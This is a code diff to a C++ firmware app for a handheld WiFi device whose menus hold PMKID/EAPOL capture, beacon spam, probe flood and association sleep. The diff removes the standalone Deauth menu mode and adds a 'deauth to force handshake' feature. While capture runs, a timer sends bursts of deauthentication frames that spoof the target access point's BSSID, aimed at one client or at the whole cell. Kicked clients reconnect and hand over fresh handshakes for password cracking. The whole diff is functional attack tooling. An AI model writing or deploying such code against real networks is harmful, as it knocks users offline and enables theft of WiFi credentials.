@@ -59,7 +59,7 @@ extern const ::AppManifest manifest;
 namespace {
 
 enum class Screen { Main, Capture, Inject, Network };
-enum class InjectMode { Beacon, Probe, Deauth, Sleep };
+enum class InjectMode { Beacon, Probe, Sleep };
 enum class NetMode { Host, Ssh, Telnet, Port };
 
 constexpr uint32_t POLL_INTERVAL_MS = 200;
@@ -67,6 +67,9 @@ constexpr size_t STREAM_BUFFER_SIZE = 1024 * 1024;
 constexpr size_t MAX_FRAME_SIZE = 2346;
 constexpr uint32_t INJECT_INTERVAL_MS = 50;
 constexpr size_t INJECT_BURST = 8;
+// Cadence for the "deauth to force handshake" elicitation while capturing: a burst of deauth
+// frames, then a short quiet gap so the kicked client can reassociate and emit a fresh EAPOL/PMKID.
+constexpr uint32_t CAPTURE_DEAUTH_INTERVAL_MS = 300;
 
 struct CaptureRecord {
     uint32_t length;
@@ -141,6 +144,7 @@ struct Context {
 
     // Inject state.
     bool injecting = false;
+    bool autoDeauth = false; // "deauth to force handshake" on the Capture screen
     InjectMode injectMode = InjectMode::Beacon;
     bool funnySsids = true;
     size_t funnyIndex = 0;
@@ -169,6 +173,7 @@ struct Context {
 
     std::unique_ptr<Timer> pollTimer;
     std::unique_ptr<Timer> injectTimer;
+    std::unique_ptr<Timer> deauthTimer;
 
     // UI widgets.
     lv_obj_t* body = nullptr;
@@ -475,6 +480,29 @@ static size_t buildDeauth(uint8_t* out, const uint8_t dest[6], const uint8_t bss
     return i;
 }
 
+// "Deauth to force handshake" elicitation, run by a dedicated timer while capture is active. Bursts
+// deauth frames that spoof the target AP's BSSID so a connected client reassociates and emits a
+// fresh EAPOL/PMKID, which the promiscuous sniffer writes to the same PCAP. Requires an AP BSSID;
+// targets one client if a MAC is set, otherwise broadcasts to the whole cell.
+static void onCaptureDeauthTick(Context* ctx) {
+    if (!ctx->autoDeauth) return;
+    if (ctx->writerThread == nullptr) return; // only while capture is running
+    if (ctx->wifi == nullptr) {
+        ctx->wifi = getWifiDevice();
+        if (ctx->wifi == nullptr) return;
+    }
+    if (!ctx->targetBssidKnown) return; // need the target AP to deauth against
+    uint8_t frame[MAX_FRAME_SIZE];
+    for (size_t n = 0; n < INJECT_BURST; ++n) {
+        const size_t len = buildDeauth(frame,
+                                       ctx->deauthClientKnown ? ctx->deauthClient : nullptr,
+                                       ctx->targetBssid,
+                                       !ctx->deauthClientKnown);
+        if (len > 0) wifi_send_raw_frame(ctx->wifi, frame, len);
+    }
+    if (ctx->lockChannel != 0) wifi_set_channel(ctx->wifi, ctx->lockChannel);
+}
+
 static void onInjectTick(Context* ctx) {
     if (!ctx->injecting) return;
     if (ctx->wifi == nullptr) {
@@ -507,11 +535,6 @@ static void onInjectTick(Context* ctx) {
             }
             case InjectMode::Sleep:
                 len = buildDeauth(frame, ctx->targetMac, usedBssid ? bssid : ctx->localMac, !usedBssid);
-                break;
-            case InjectMode::Deauth:
-                // Targeted when a client MAC is set, otherwise broadcast. Spoof the AP's BSSID
-                // as the source (Addr2/Addr3) so clients treat it as the AP deauthenticating them.
-                len = buildDeauth(frame, ctx->deauthClient, usedBssid ? bssid : ctx->localMac, !ctx->deauthClientKnown);
                 break;
         }
         if (len > 0) {
@@ -698,6 +721,9 @@ static void showMainScreen(Context* ctx);
 static void showCaptureScreen(Context* ctx);
 static void showInjectScreen(Context* ctx);
 static void showNetworkScreen(Context* ctx);
+// Shared by the Inject screen's BSSID spoof field and the Capture screen's deauth-target fields.
+static void onInjectBssidChanged(lv_event_t* event);
+static void onInjectClientMacChanged(lv_event_t* event);
 
 static void ShowScreen(Context* ctx, Screen screen) {
     ctx->screen = screen;
@@ -744,14 +770,12 @@ static void setInjectModeAndGo(Context* ctx, InjectMode mode) {
 }
 static void onGoBeacon(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Beacon); }
 static void onGoProbe(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Probe); }
-static void onGoDeauth(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Deauth); }
 static void onGoSleep(lv_event_t* e) { setInjectModeAndGo(static_cast<Context*>(lv_event_get_user_data(e)), InjectMode::Sleep); }
 
 static void showMainScreen(Context* ctx) {
     addMenuButton(ctx, "PMKID / EAPOL Capture", onGoCapture);
     addMenuButton(ctx, "Beacon Spam", onGoBeacon);
     addMenuButton(ctx, "Probe Flood", onGoProbe);
-    addMenuButton(ctx, "Deauth (targeted + broadcast)", onGoDeauth);
     addMenuButton(ctx, "Association Sleep", onGoSleep);
     addMenuButton(ctx, "WiFi + Net Utilities", onGoNetwork);
 }
@@ -761,11 +785,12 @@ static void onCaptureStartStop(lv_event_t* event) {
     auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
 #if defined(CONFIG_SOC_WIFI_SUPPORTED)
     if (ctx->writerThread != nullptr || ctx->injecting) {
-        // Stopping: tear down injection if it's the active capture path.
+        // Stopping: tear down injection and deauth-elicitation if active.
         if (ctx->injecting) {
             ctx->injecting = false;
             ctx->injectTimer->stop();
         }
+        ctx->deauthTimer->stop();
         stopCapture(ctx);
     } else {
         ensureWifiOn();
@@ -774,6 +799,7 @@ static void onCaptureStartStop(lv_event_t* event) {
         ctx->pmkidCount = 0;
         ctx->deauthCount = 0;
         startCapture(ctx);
+        if (ctx->autoDeauth) ctx->deauthTimer->start();
     }
 #endif
 }
@@ -800,6 +826,19 @@ static void onCaptureMacChanged(lv_event_t* event) {
     }
 }
 
+static void onCaptureDeauthToggled(lv_event_t* event) {
+    auto* ctx = static_cast<Context*>(lv_event_get_user_data(event));
+    auto* sw = static_cast<lv_obj_t*>(lv_event_get_target(event));
+    ctx->autoDeauth = lv_obj_has_state(sw, LV_STATE_CHECKED);
+#if defined(CONFIG_SOC_WIFI_SUPPORTED)
+    // Deauth-elicitation only makes sense while capture is active, so gate the timer on that.
+    if (ctx->writerThread != nullptr) {
+        if (ctx->autoDeauth) ctx->deauthTimer->start();
+        else ctx->deauthTimer->stop();
+    }
+#endif
+}
+
 static void showCaptureScreen(Context* ctx) {
     auto* label = lv_label_create(ctx->body);
     lv_label_set_text(label, "Captures 802.11 EAPOL/PMKID to PCAP.");
@@ -819,6 +858,33 @@ static void showCaptureScreen(Context* ctx) {
     lv_textarea_set_one_line(macTextarea, true);
     lv_obj_set_width(macTextarea, LV_PCT(100));
     lv_obj_add_event_cb(macTextarea, onCaptureMacChanged, LV_EVENT_VALUE_CHANGED, ctx);
+
+    // Deauth-to-force-handshake: while capturing, burst deauth frames (spoofing the target AP) so a
+    // connected client reassociates and emits a fresh EAPOL/PMKID that the sniffer writes to PCAP.
+    auto* deauthRow = lv_obj_create(ctx->body);
+    lv_obj_set_width(deauthRow, LV_PCT(100));
+    lv_obj_set_flex_flow(deauthRow, LV_FLEX_FLOW_ROW);
+    lv_obj_set_style_pad_all(deauthRow, 0, LV_STATE_DEFAULT);
+    lv_obj_set_style_pad_column(deauthRow, 8, LV_STATE_DEFAULT);
+    auto* deauthLabel = lv_label_create(deauthRow);
+    lv_obj_set_flex_grow(deauthLabel, 1);
+    lv_label_set_text(deauthLabel, "Deauth to force handshake");
+    auto* deauthSwitch = lv_switch_create(deauthRow);
+    lv_obj_add_event_cb(deauthSwitch, onCaptureDeauthToggled, LV_EVENT_VALUE_CHANGED, ctx);
+
+    auto* deauthBssid = lv_textarea_create(ctx->body);
+    lv_textarea_set_placeholder_text(deauthBssid, "Deauth AP BSSID (required), e.g. 34:3e:a4:7e:90:45");
+    lv_textarea_set_one_line(deauthBssid, true);
+    lv_textarea_set_accepted_chars(deauthBssid, "0123456789abcdefABCDEF:");
+    lv_obj_set_width(deauthBssid, LV_PCT(100));
+    lv_obj_add_event_cb(deauthBssid, onInjectBssidChanged, LV_EVENT_VALUE_CHANGED, ctx);
+
+    auto* deauthClientTa = lv_textarea_create(ctx->body);
+    lv_textarea_set_placeholder_text(deauthClientTa, "Client MAC to deauth (blank = all clients)");
+    lv_textarea_set_one_line(deauthClientTa, true);
+    lv_textarea_set_accepted_chars(deauthClientTa, "0123456789abcdefABCDEF:");
+    lv_obj_set_width(deauthClientTa, LV_PCT(100));
+    lv_obj_add_event_cb(deauthClientTa, onInjectClientMacChanged, LV_EVENT_VALUE_CHANGED, ctx);
 
     auto* button = lv_button_create(ctx->body);
     lv_obj_set_width(button, LV_PCT(100));
@@ -883,15 +949,13 @@ static void onInjectClientMacChanged(lv_event_t* event) {
 }
 
 static void showInjectScreen(Context* ctx) {
-    bool isDeauth = (ctx->injectMode == InjectMode::Deauth);
     const char* modeText = ctx->injectMode == InjectMode::Beacon ? "Beacon Spam"
-        : (ctx->injectMode == InjectMode::Probe ? "Probe Flood"
-        : (ctx->injectMode == InjectMode::Deauth ? "Deauth" : "Association Sleep"));
+        : (ctx->injectMode == InjectMode::Probe ? "Probe Flood" : "Association Sleep");
     auto* label = lv_label_create(ctx->body);
     lv_label_set_text(label, modeText);
 
-    // SSID input for beacon/probe only; deauth/sleep don't use it.
-    if (ctx->injectMode != InjectMode::Deauth && ctx->injectMode != InjectMode::Sleep) {
+    // SSID input for beacon/probe only; sleep (which reuses deauth frames) doesn't use it.
+    if (ctx->injectMode != InjectMode::Sleep) {
         auto* ssidTextarea = lv_textarea_create(ctx->body);
         lv_textarea_set_placeholder_text(ssidTextarea, "SSID (blank = Funny list for beacon)");
         lv_textarea_set_one_line(ssidTextarea, true);
@@ -900,22 +964,13 @@ static void showInjectScreen(Context* ctx) {
         lv_obj_add_event_cb(ssidTextarea, onInjectSsidChanged, LV_EVENT_VALUE_CHANGED, ctx);
     }
 
-    // AP BSSID spoofed as the frame source for deauth/sleep.
+    // AP BSSID spoofed as the frame source for sleep.
     auto* bssidTextarea = lv_textarea_create(ctx->body);
     lv_textarea_set_placeholder_text(bssidTextarea, "AP BSSID to spoof (aa:bb:cc:dd:ee:ff)");
     lv_textarea_set_one_line(bssidTextarea, true);
     lv_textarea_set_accepted_chars(bssidTextarea, "0123456789abcdefABCDEF:");
     lv_obj_set_width(bssidTextarea, LV_PCT(100));
     lv_obj_add_event_cb(bssidTextarea, onInjectBssidChanged, LV_EVENT_VALUE_CHANGED, ctx);
-
-    if (isDeauth) {
-        auto* clientTextarea = lv_textarea_create(ctx->body);
-        lv_textarea_set_placeholder_text(clientTextarea, "Client MAC to deauth (blank = broadcast all)");
-        lv_textarea_set_one_line(clientTextarea, true);
-        lv_textarea_set_accepted_chars(clientTextarea, "0123456789abcdefABCDEF:");
-        lv_obj_set_width(clientTextarea, LV_PCT(100));
-        lv_obj_add_event_cb(clientTextarea, onInjectClientMacChanged, LV_EVENT_VALUE_CHANGED, ctx);
-    }
 
     // Channel selector.
     auto* channelDropdown = lv_dropdown_create(ctx->body);
@@ -1026,6 +1081,7 @@ static void onPollTick(Context* ctx) {
                 (unsigned)ctx->droppedCount.load(),
                 (unsigned)(ctx->writer.getBytesWritten() / 1024),
                 (unsigned)ctx->currentChannel.load());
+            if (ctx->autoDeauth && ctx->writerThread != nullptr) text += "  +deauth";
         }
         lv_label_set_text(ctx->statsLabel, text.c_str());
     }
@@ -1095,6 +1151,11 @@ int32_t appMain(int argc, char* argv[]) {
         onInjectTick(&ctx);
 #endif
     });
+    ctx.deauthTimer = std::make_unique<Timer>(Timer::Type::Periodic, millis_to_ticks(CAPTURE_DEAUTH_INTERVAL_MS), [&ctx] {
+#if defined(CONFIG_SOC_WIFI_SUPPORTED)
+        onCaptureDeauthTick(&ctx);
+#endif
+    });
 
     TaskEventGroup event_group;
     task_event_group_construct(&event_group);
@@ -1113,6 +1174,7 @@ int32_t appMain(int argc, char* argv[]) {
 #if defined(CONFIG_SOC_WIFI_SUPPORTED)
                 ctx.injecting = false;
                 ctx.injectTimer->stop();
+                ctx.deauthTimer->stop();
                 ctx.writerStop = true;
                 stopCapture(&ctx);
 #endif
